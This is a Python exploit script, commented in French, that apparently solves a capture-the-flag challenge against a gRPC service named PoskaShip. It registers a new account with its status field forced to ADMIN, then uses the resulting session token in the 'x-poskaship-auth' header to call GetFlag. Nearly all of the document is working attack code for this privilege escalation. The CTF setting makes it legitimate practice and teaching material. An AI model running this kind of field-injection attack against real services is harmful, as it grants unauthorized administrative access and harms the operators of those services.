import grpc
import random
import string

# Import des modules fournis dans le challenge
# Assurez-vous que les fichiers .so sont dans le même dossier
from client import create_client_channel, PoskaShipStub
import poskaship_pb2

def get_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

def main():
    target = 'www.passetonhack.fr'
    
    # 1. Connexion au serveur
    # Le fichier test-client.py montre l'usage de create_client_channel avec tls=True
    with create_client_channel(target, tls=True) as channel:
        stub = PoskaShipStub(channel)
        
        # Génération d'identifiants aléatoires
        username = f"user_{get_random_string()}"
        password = "password123"
        
        print(f"[*] Tentative d'inscription avec {username}...")

        # 2. Exploitation : Création d'un profil malveillant
        # On force le status à 2 (ADMIN) directement dans la requête d'inscription
        malicious_profile = poskaship_pb2.Profile(
            username=username,
            password=password,
            status=2  # 2 correspond à ADMIN selon l'enum UserStatus trouvé dans le binaire
        )

        try:
            # Appel RPC Register
            response = stub.Register(malicious_profile)
            
            if response.success:
                # 3. Récupération de la session ADMIN
                session_id = response.success.session.session_id
                print(f"[+] Compte Admin créé ! Session ID : {session_id}")
                
                # 4. Appel de GetFlag avec le token de session
                # Le header d'auth 'x-poskaship-auth' a été trouvé dans client.so
                metadata = [('x-poskaship-auth', session_id)]
                
                print("[*] Récupération du flag...")
                flag_resp = stub.GetFlag(poskaship_pb2.EmptyRequest(), metadata=metadata)
                
                if flag_resp.success:
                    print(f"\n>>> FLAG: {flag_resp.success.flag} <<<\n")
                else:
                    print(f"[-] Erreur lors de la récupération du flag : {flag_resp}")
            else:
                print(f"[-] Échec de l'inscription : {response}")

        except grpc.RpcError as e:
            print(f"[-] Erreur gRPC : {e}")

if __name__ == '__main__':
    main()